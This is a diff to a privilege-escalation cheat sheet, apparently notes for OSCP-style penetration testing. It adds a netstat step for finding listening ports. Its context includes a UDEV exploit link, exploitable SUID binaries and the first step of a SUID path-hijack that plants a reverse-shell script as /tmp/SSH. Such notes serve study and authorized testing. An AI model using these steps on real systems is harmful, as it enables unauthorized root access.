@@ -439,6 +439,12 @@ $ sudo su	# execute su as root
 $ su root	# become root
 ```
 
+Localhost L=listening ports:
+* Look for ports that were not exposed to your initial public nmap scan.
+```bash
+$ netstat -alntp
+```
+
 UDEV
 * Guide: http://www.madirish.net/370
 * Exploit Code: https://www.exploit-db.com/exploits/8478
@@ -463,7 +469,7 @@ Exploitable SUIDs / SGIDs:
 /usr/local/bin/{REDACTED} (OSCP)
 ```
 
-Exploit unquoted / non-fullpath binaries:
+SUID: Exploit unquoted / non-fullpath binaries:
 * EXAMPLE: '/usr/local/bin/brian' is a SUID binary that references SSH in the program, but is unquoted.
 ```bash
 $ mv reverse-shell.sh /tmp/SSH       # STEP 1: Move reverse-shell.sh to /tmp folder, renamed to SSH.
